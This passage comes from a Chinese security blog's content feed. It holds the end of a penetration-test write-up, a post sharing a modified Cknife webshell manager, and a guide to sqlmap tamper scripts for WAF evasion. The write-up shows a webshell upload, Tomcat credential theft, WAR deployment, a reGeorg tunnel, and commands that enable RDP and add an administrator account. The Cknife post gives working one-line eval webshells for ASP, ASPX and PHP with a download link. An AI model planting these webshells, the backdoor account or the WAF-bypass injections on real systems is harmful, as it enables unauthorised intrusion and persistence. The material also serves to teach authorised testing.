半个多小时- -</h4><h4 id="在D盘-发现大量web应用文件夹-这也让我直接认定了网站在D-盘"><a href="#在D盘-发现大量web应用文件夹-这也让我直接认定了网站在D-盘" class="headerlink" title="在D盘 发现大量web应用文件夹 这也让我直接认定了网站在D 盘"></a>在D盘 发现大量web应用文件夹 这也让我直接认定了网站在D 盘</h4><h4 id="再加上我-dir-e-f-g-都没有发现分区就造成了本次再找路径上浪费了大量时间"><a href="#再加上我-dir-e-f-g-都没有发现分区就造成了本次再找路径上浪费了大量时间" class="headerlink" title="再加上我 dir e:\ f:\ g:\ 都没有发现分区就造成了本次再找路径上浪费了大量时间 - -"></a>再加上我 dir e:\ f:\ g:\ 都没有发现分区就造成了本次再找路径上浪费了大量时间 - -</h4><h3 id="直接在D盘搜索网站根目录下的service1-asmx-文件出来一堆路径只能挨个试"><a href="#直接在D盘搜索网站根目录下的service1-asmx-文件出来一堆路径只能挨个试" class="headerlink" title="直接在D盘搜索网站根目录下的service1.asmx 文件出来一堆路径只能挨个试"></a>直接在D盘搜索网站根目录下的service1.asmx 文件出来一堆路径只能挨个试</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978236258.webp" alt="image"></p><h4 id="然后就是一顿echo-echo-echo…-直到尝试完最后一个-都是404"><a href="#然后就是一顿echo-echo-echo…-直到尝试完最后一个-都是404" class="headerlink" title="然后就是一顿echo echo echo…   直到尝试完最后一个 都是404"></a>然后就是一顿echo echo echo…   直到尝试完最后一个 都是404</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978600951.webp" alt="image"></p><h4 id="然后怀疑是不是站库分离-netstat-看了眼-发现不存在分离-顺带还发现服务器对外开了一个-8040端口"><a href="#然后怀疑是不是站库分离-netstat-看了眼-发现不存在分离-顺带还发现服务器对外开了一个-8040端口" class="headerlink" title="然后怀疑是不是站库分离 netstat 看了眼 发现不存在分离 顺带还发现服务器对外开了一个 8040端口"></a>然后怀疑是不是站库分离 netstat 看了眼 发现不存在分离 顺带还发现服务器对外开了一个 8040端口</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978754711.webp" alt="image"></p><h4 id="对应信息收集时收集的资产-发现还有一套网站在这个服务器"><a href="#对应信息收集时收集的资产-发现还有一套网站在这个服务器" class="headerlink" title="对应信息收集时收集的资产 发现还有一套网站在这个服务器"></a>对应信息收集时收集的资产 发现还有一套网站在这个服务器</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978767499.webp" alt="image"></p><h4 id="又来了兴致-直接搜索这个网站的路径-进行写入测试"><a href="#又来了兴致-直接搜索这个网站的路径-进行写入测试" class="headerlink" title="又来了兴致 直接搜索这个网站的路径  进行写入测试"></a>又来了兴致 直接搜索这个网站的路径  进行写入测试</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978844830.webp" alt="image"></p><h4 id="结果一线的404"><a href="#结果一线的404" class="headerlink" title="结果一线的404  - -"></a>结果一线的404  - -</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978897821.webp" alt="image"></p><h4 id="这时才想起是不是搞错盘了-直接列出机器所有盘符"><a href="#这时才想起是不是搞错盘了-直接列出机器所有盘符" class="headerlink" title="这时才想起是不是搞错盘了 直接列出机器所有盘符"></a>这时才想起是不是搞错盘了 直接列出机器所有盘符</h4><pre><code>    wmic logicaldisk where drivetype=3 get deviceid</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979005779.webp" alt="image"></p><h1 id="黑人问号"><a href="#黑人问号" class="headerlink" title="黑人问号?"></a>黑人问号?</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980833753.webp" alt="image"></p><h4 id="这管理员真会分-然后就是找到路径写入一句话-顺利的拿下一个-aspx-的低权限shell"><a href="#这管理员真会分-然后就是找到路径写入一句话-顺利的拿下一个-aspx-的低权限shell" class="headerlink" title="这管理员真会分 然后就是找到路径写入一句话 顺利的拿下一个.aspx 的低权限shell"></a>这管理员真会分 然后就是找到路径写入一句话 顺利的拿下一个.aspx 的低权限shell</h4><h4 id="————被自己前面的-操作蠢哭"><a href="#————被自己前面的-操作蠢哭" class="headerlink" title="————被自己前面的**操作蠢哭"></a>————被自己前面的**操作蠢哭</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979143916.webp" alt="image"></p><h1 id="3-简单提权与进入内网"><a href="#3-简单提权与进入内网" class="headerlink" title="3.简单提权与进入内网"></a>3.简单提权与进入内网</h1><h2 id="3-1-简单提权"><a href="#3-1-简单提权" class="headerlink" title="3.1 简单提权"></a>3.1 简单提权</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596981018253.webp" alt="image"></p><h4 id="在拿到shell后-翻看目录时发现有个-tomcat-立马想到了一遍-tomcat搭建的权限会比较高"><a href="#在拿到shell后-翻看目录时发现有个-tomcat-立马想到了一遍-tomcat搭建的权限会比较高" class="headerlink" title="在拿到shell后 翻看目录时发现有个 tomcat 立马想到了一遍 tomcat搭建的权限会比较高"></a>在拿到shell后 翻看目录时发现有个 tomcat 立马想到了一遍 tomcat搭建的权限会比较高</h4><h4 id="netstat-看到一个8086端口-不知道为什么前面没看到-可能瞎了-访问确定存在-tomcat"><a href="#netstat-看到一个8086端口-不知道为什么前面没看到-可能瞎了-访问确定存在-tomcat" class="headerlink" title="netstat 看到一个8086端口 不知道为什么前面没看到 可能瞎了 访问确定存在 tomcat"></a>netstat 看到一个8086端口 不知道为什么前面没看到 可能瞎了 访问确定存在 tomcat</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979365044.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979395408.webp" alt="image"></p><h4 id="找到conf-目录下的-tomcat-users-xml-文件查看明文密码"><a href="#找到conf-目录下的-tomcat-users-xml-文件查看明文密码" class="headerlink" title="找到conf 目录下的 tomcat-users.xml 文件查看明文密码"></a>找到conf 目录下的 tomcat-users.xml 文件查看明文密码</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979621553.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596992711277.webp" alt="image"></p><h4 id="然后就是进入后台-部署war包了-成功获取到一个jsp的shell-成功获取到-管理员权限shell"><a href="#然后就是进入后台-部署war包了-成功获取到一个jsp的shell-成功获取到-管理员权限shell" class="headerlink" title="然后就是进入后台 部署war包了 成功获取到一个jsp的shell 成功获取到 管理员权限shell"></a>然后就是进入后台 部署war包了 成功获取到一个jsp的shell 成功获取到 管理员权限shell</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979530881.webp" alt="image"></p><h2 id="3-2-进入内网"><a href="#3-2-进入内网" class="headerlink" title="3.2 进入内网"></a>3.2 进入内网</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596981170981.webp" alt="image"></p><h2 id="这里我用到-reGeorg-与-SocksCap64-的搭配"><a href="#这里我用到-reGeorg-与-SocksCap64-的搭配" class="headerlink" title="这里我用到 reGeorg 与 SocksCap64 的搭配"></a>这里我用到 reGeorg 与 SocksCap64 的搭配</h2><h4 id="上传reGeorg-中的-jsp脚本到网站目录"><a href="#上传reGeorg-中的-jsp脚本到网站目录" class="headerlink" title="上传reGeorg 中的 jsp脚本到网站目录"></a>上传reGeorg 中的 jsp脚本到网站目录</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979999413.webp" alt="image"></p><h4 id="访问脚本-出现-Georg-says-‘All-seems-fine’-说明可用"><a href="#访问脚本-出现-Georg-says-‘All-seems-fine’-说明可用" class="headerlink" title="访问脚本 出现 Georg says, ‘All seems fine’ 说明可用"></a>访问脚本 出现 Georg says, ‘All seems fine’ 说明可用</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980036691.webp" alt="image"></p><h4 id="使用reGeorg连接-脚本"><a href="#使用reGeorg连接-脚本" class="headerlink" title="使用reGeorg连接 脚本"></a>使用reGeorg连接 脚本</h4><pre><code>    python xx.py -u 脚本地址    </code></pre><h4 id="可看到已成功开启代理到本地8888端口"><a href="#可看到已成功开启代理到本地8888端口" class="headerlink" title="可看到已成功开启代理到本地8888端口"></a>可看到已成功开启代理到本地8888端口</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980134130.webp" alt="image"></p><h4 id="打开第二个工具-SocksCap64-进行地址与代理-端口与类型设置"><a href="#打开第二个工具-SocksCap64-进行地址与代理-端口与类型设置" class="headerlink" title="打开第二个工具 SocksCap64 进行地址与代理 端口与类型设置"></a>打开第二个工具 SocksCap64 进行地址与代理 端口与类型设置</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980193556.webp" alt="image"></p><h4 id="把需要在目标内网环境运行的程序拖入"><a href="#把需要在目标内网环境运行的程序拖入" class="headerlink" title="把需要在目标内网环境运行的程序拖入"></a>把需要在目标内网环境运行的程序拖入</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980230729.webp" alt="image"></p><h4 id="发现未开启3389-使用cmd开启"><a href="#发现未开启3389-使用cmd开启" class="headerlink" title="发现未开启3389  使用cmd开启"></a>发现未开启3389  使用cmd开启</h4><pre><code>    开启RDP ： REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f    查询端口 ： REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code></pre><h4 id="添加-用户"><a href="#添加-用户" class="headerlink" title="添加 用户"></a>添加 用户</h4><pre><code>    添加用户               ：net user xxx xxx /add    添加进administrators  ：net localgroup administrators xxx /add</code></pre><h4 id="软件内打开远程桌面-连接目标机器内网地址-登录添加的用户"><a href="#软件内打开远程桌面-连接目标机器内网地址-登录添加的用户" class="headerlink" title="软件内打开远程桌面 连接目标机器内网地址 登录添加的用户"></a>软件内打开远程桌面 连接目标机器内网地址 登录添加的用户</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980290407.webp" alt="image"></p><h4 id="然后就是抓取管理员明文密码-收集浏览器缓存密码-收集网站数据库明文密码-扫描内网web应用进行测试-扫描ms17010等windos漏洞-等等了-由于客户叫停不再继续"><a href="#然后就是抓取管理员明文密码-收集浏览器缓存密码-收集网站数据库明文密码-扫描内网web应用进行测试-扫描ms17010等windos漏洞-等等了-由于客户叫停不再继续" class="headerlink" title="然后就是抓取管理员明文密码 收集浏览器缓存密码 收集网站数据库明文密码 扫描内网web应用进行测试 扫描ms17010等windos漏洞 等等了   由于客户叫停不再继续"></a>然后就是抓取管理员明文密码 收集浏览器缓存密码 收集网站数据库明文密码 扫描内网web应用进行测试 扫描ms17010等windos漏洞 等等了   由于客户叫停不再继续</h4><h1 id="大佬不要喷我"><a href="#大佬不要喷我" class="headerlink" title="大佬不要喷我 "></a>大佬不要喷我 <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980628247.webp" alt="image"></h1>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 渗透记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透笔记 </tag>
            
            <tag> 记一次渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次对某汽车公司的简单渗透过程</title>
      <link href="2020/08/08/%E6%9F%90%E6%B1%BD%E8%BD%A6%E5%85%AC%E5%8F%B8/"/>
      <url>2020/08/08/%E6%9F%90%E6%B1%BD%E8%BD%A6%E5%85%AC%E5%8F%B8/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抽根利群冷静下再想想！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="391006398fd01c12262e104c35b0c424914de6f596e434955d10151fd250e594">09f7e28a2ee5cc0acb1a500e2b9fb1297435f08653cb47d2da75f53c9bdce32a16820912d1844e581a03f7cbba597a45bf7bdc57409694c6d8c79ef9a4efe06d7ee82643d7b01df0e7a71a79f6ab8add434d56b350eee73dfe0837d2d9d0dd36694baae8ec58991bff627b81cf3e104c10c0dddc49ef32a94673b99a671a0ad0b78059f2ca95f8d4cdd4ca9603037249856e9727a56e53309950a7fc2dc896fd459a59ace9919988e787c7349dd6fa2e448c00de9317b94b047a888b44deaff97d1520de4dfbad27e17e398f9e97bf221ff6910c0f976b9c615751bbb7c64cba15bc99f475a9fd73fe24e93d3f1c2717e95270529c63cb5be0f226fbf134324db62bf7f7ba5d3551beda5b90765ef37670d2ce5f53feff969354f785fe25052c0056956ea6abff08b3d8d791cc49076eba873a1ca200fe6c7ef18d19f7d8dad46bccff0329c96af23ff962a534a361ac371b3bf9ed78f84bcb2a98b5a9c2c65587c956d9d139155e171e2306eaf4fbd53b3a0b1b4f0fc46fcdc4efe5e9ac1cdfa183ae6b0aae7d67bddd3e34a1c9dd49d86945957b2b3dafad4e1545b86f44af94625299b08ef28c07c9b06a554d910d60a77699191dda8d364bc5cbab008219056b7f8f008617a579df32891bc9a7214161485b191f83689557efec762aea4bfd2422db821f241d040f6d594b0bb489a8c145f2b306c3fa836c9137f283744cf07cba47f55de22d7f1a27cb7606d6d5902741d63e728192210ff3d4df12de7c0519f9a5e852eef44db3cbf5bace565a097f945f44b23d9b0ed1fbf5fe82fb2ea51eaf7081004b77bce2030b8edc762a6ca372a66dde5c2108beee9cbe1331450f26bbe2f7e7222dee54f13f5ef3c89276a31f0fbfd95c6b81a24599a8eff8b109f1f0eadd9e61ad3f988ea0ccecb7222f83c11fccfebdbfc2cac9f57b6b6573bcf876ef37c23ac1aecfdfebdcd2f43dc31be670740effae232f0b5502ec5c3a8ec17b7f07dcc14893bf44b9c91e0a5d1f7bb23e9984565e0e417dea380f49aeef3d5cc79e30808cdccaa1a0a07bd2a860c6442014b520517a476e552e04187adaf3fddc300f28328c10fb781af4cc60fb2bb3c6ed189c0c2ee89b02aacb18971aa17ca0a2161baea0540eaddb2cb57f679134011e4834def4c86c8dfd92944887afe4e1399951dff51db0c5f94f0da848e3c9d168d7c5fcc5bf390fbaea4801de1fc5a23e2e13405ff282c9af5b7ebd61d9b6189db40bf4e683de007510dabd4668de83e8814bc1422713a31cca5b57e317ac75d94241baba68261f8dab1325f5d4ed883af401e77e6c6a57b9201e58eef195c3ac5dc52d296a2177f9c26dbf58cf001382519d255cc91cc92a3e40add5eca3f1abf4aab8de71efc7bc6903d152bc83e5e85bfff3a697dfed2e816d1b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂不公开                                                                                                                                                                                   .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap使用 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> c段 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cknife 跨平台菜刀 修改版</title>
      <link href="2020/06/18/untitled-1592474049377/"/>
      <url>2020/06/18/untitled-1592474049377/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="修复了一些兼容问题"><a href="#修复了一些兼容问题" class="headerlink" title="修复了一些兼容问题"></a>修复了一些兼容问题</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1592474501589.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1592474702573.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1592474878695.webp" alt="image"></p><h2 id="完美支持ASP、ASPX、PHP、JSP、JSPX、Customize-自定义"><a href="#完美支持ASP、ASPX、PHP、JSP、JSPX、Customize-自定义" class="headerlink" title="完美支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)"></a>完美支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)</h2><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP:"></a>ASP:</h3><pre><code>&lt;%eval request(&quot;Liqun&quot;)%&gt;</code></pre><h3 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET:"></a>ASP.NET:</h3><pre><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;Liqun&quot;],&quot;unsafe&quot;);%&gt;</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP:"></a>PHP:</h3><pre><code>&lt;?php @eval($_POST[&#39;Liqun&#39;]);?&gt;</code></pre><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP:"></a>JSP:</h3><pre><code>[代码详见1.jsp]</code></pre><h3 id="JSPX"><a href="#JSPX" class="headerlink" title="JSPX:"></a>JSPX:</h3><pre><code>[代码详见1.jspx]</code></pre><h3 id="Customize"><a href="#Customize" class="headerlink" title="Customize:"></a>Customize:</h3><p>下载地址  ： <a href="https://www.ailiqun.xyz/images/Liqun.rar">Liqun.rar</a></p><pre><code>自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确进行交互即可    原作者开源项目地址 ： https://github.com/Chora10/Cknife</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 菜刀 </tag>
            
            <tag> webshell </tag>
            
            <tag> 网站管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap tamper 相关脚本的详细解读</title>
      <link href="2020/06/15/tamper/"/>
      <url>2020/06/15/tamper/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、SQLMap中tamper的简介"><a href="#一、SQLMap中tamper的简介" class="headerlink" title="一、SQLMap中tamper的简介"></a>一、SQLMap中tamper的简介</h1><h2 id="1-tamper的作用"><a href="#1-tamper的作用" class="headerlink" title="1.tamper的作用"></a>1.tamper的作用</h2><p>使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。</p><p>部分防护系统的缩写：</p><p>WAF：Web应用程序防火墙，Web Application Firewall<br>IPS：入侵防御系统， Intrusion Prevention System<br>IDS：入侵检测系统，Intrusion Detection System</p><h2 id="2-tamper用法"><a href="#2-tamper用法" class="headerlink" title="2.tamper用法"></a>2.tamper用法</h2><p>–tamper=TAMPER 利用给定的脚本进行篡改注入数据。其用法可举例说明：<br>python sqlmap.py -u “http://…/?uname=admin&amp;pwd=pass123” –level=5 –risk=3 -p “uname” –tamper=xxx.py<br>表示对指定的url地址，以所设置的level等级、risk等级，并采用选定的tamper篡改脚本对参数“uname”进行检测</p><h1 id="二、适配不同数据库类型的测试tamper"><a href="#二、适配不同数据库类型的测试tamper" class="headerlink" title="二、适配不同数据库类型的测试tamper"></a>二、适配不同数据库类型的测试tamper</h1><p>当使用SQLMap篡改脚本执行渗透测试时，面对众多tamper可能会比较困惑，一开始不晓得该使用哪些脚本来测试。有的脚本是适用于常用数据库的SQL注入攻击，有的适用于特定类型的数据库，还有的适用于某种数据库的特定版本范围。为了相对明确的了解tamper的使用场景，把tamper的使用类型和范围作一下划分，具体如下：</p><h2 id="SQLMap目录中的所有tamper-script"><a href="#SQLMap目录中的所有tamper-script" class="headerlink" title="SQLMap目录中的所有tamper script"></a>SQLMap目录中的所有tamper script</h2><pre><code>tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords</code></pre><h2 id="通用的测试tamper"><a href="#通用的测试tamper" class="headerlink" title="通用的测试tamper"></a>通用的测试tamper</h2><pre><code>tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</code></pre><h2 id="MSSQL-Microsoft-SQL-Servre"><a href="#MSSQL-Microsoft-SQL-Servre" class="headerlink" title="MSSQL(Microsoft SQL Servre)"></a>MSSQL(Microsoft SQL Servre)</h2><pre><code>tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</code></pre><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><pre><code>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor</code></pre><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><pre><code>tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor</code></pre><h2 id="Microsoft-Access"><a href="#Microsoft-Access" class="headerlink" title="Microsoft Access"></a>Microsoft Access</h2><pre><code>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords</code></pre><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><pre><code>  tamper=  between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesp  here,space2comment,space2plus,spae2randomblank,xforwardedfor</code></pre><h2 id="tamper适用的数据库类型-amp-版本"><a href="#tamper适用的数据库类型-amp-版本" class="headerlink" title="tamper适用的数据库类型&amp;版本"></a>tamper适用的数据库类型&amp;版本</h2><table><thead><tr><th align="left">TAMPER</th><th align="left">MySQL</th><th align="left">MSSQL</th><th align="left">Oracle</th><th align="left">PostgreSQL</th></tr></thead><tbody><tr><td align="left">apostrophemask</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">apostrophenullencode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">appendnullbyte</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">base64encode</td><td align="left">4,5,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">-</td></tr><tr><td align="left">between</td><td align="left">5.1</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">bluecoat</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">apostrophemask</td><td align="left">9.0.3</td><td align="left">20002005</td><td align="left">-</td><td align="left">9.3</td></tr><tr><td align="left">charunicodeencode</td><td align="left">4,5.0 and 5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">charencode</td><td align="left">*</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">commalessmid</td><td align="left">*</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">concat2concatws</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">equaltolike</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">greatest</td><td align="left">&lt; 5.1</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">halfversionedmorekeywords</td><td align="left">5.0 and 5.5</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">ifnull2ifisnull</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">informationschemacomment</td><td align="left">4,5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">lowercase</td><td align="left">5</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">modsecurityversioned</td><td align="left">5</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">modsecurityzeroversioned</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">multiplespaces</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">nonrecursivereplacement</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">overlongutf8</td><td align="left">5.1.56,5.5.11</td><td align="left">2000, 2005</td><td align="left">N/A</td><td align="left">9</td></tr><tr><td align="left">percentage</td><td align="left">4, 5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">randomcase</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">randomcomments</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">securesphere</td><td align="left">4,5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">space2comment</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2dash</td><td align="left">4.0,5.0</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2hash</td><td align="left">&gt;= 5.1.13</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2morehash</td><td align="left">-</td><td align="left">2000, 2005</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2mssqlblank</td><td align="left">*</td><td align="left">*</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2mssqlhash</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">space2plus</td><td align="left">4,5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">space2randomblank</td><td align="left">-</td><td align="left">*</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">sp_password</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">symboliclogical</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">unionalltounion</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">unmagicquotes</td><td align="left">4, 5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">uppercase</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">varnish</td><td align="left">*</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">versionedkeywords</td><td align="left">&gt;=5.1.13</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">versionedmorekeywords</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">xforwardedfor</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr></tbody></table><h1 id="三、SQLMap中tamper篡改脚本的功能解释"><a 